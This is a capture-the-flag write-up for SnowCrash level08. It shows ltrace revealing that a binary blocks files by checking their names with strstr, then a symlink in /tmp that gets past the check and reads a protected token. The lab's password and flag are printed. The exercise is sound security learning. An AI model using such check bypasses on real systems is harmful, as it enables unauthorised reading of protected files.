## level08

Again a binary. It opens, reads and write a file. We have also a file named `token` that we don’t have the right to read. Obviously we try to read it with our file: denied.

But running `ltrace` on the binary we see that the check is made with `strstr` just checking if we asked to open a file that contains ‘token’ in the name. We can probably work around that…

```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                                             = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                                         = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Would it work to use a symlink named differently pointing at our token?

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/bar
level08@SnowCrash:~$ ./level08 /tmp/bar
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

### Key Learnings
- Symlinks can be used to bypass checks